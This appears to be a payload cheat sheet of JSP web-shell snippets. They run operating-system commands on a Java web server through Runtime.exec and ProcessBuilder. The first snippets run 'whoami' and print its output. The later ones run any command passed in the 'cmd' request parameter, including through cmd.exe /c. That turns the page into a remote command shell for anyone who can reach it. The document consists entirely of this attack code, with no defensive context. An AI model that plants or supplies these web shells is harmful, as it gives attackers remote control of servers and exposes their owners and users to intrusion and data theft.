<%-- Basic Runtime.exec --%>
<%= Runtime.getRuntime().exec("whoami") %>

<%-- With Process output --%>
<%
Process p = Runtime.getRuntime().exec("whoami");
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = br.readLine()) != null) {
    out.println(line);
}
%>

<%-- One-liner with output --%>
<%@page import="java.io.*" %>
<%= new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream())).readLine() %>

<%-- Using ProcessBuilder --%>
<%
String[] cmd = {"cmd.exe", "/c", request.getParameter("cmd")};
ProcessBuilder pb = new ProcessBuilder(cmd);
Process p = pb.start();
%>
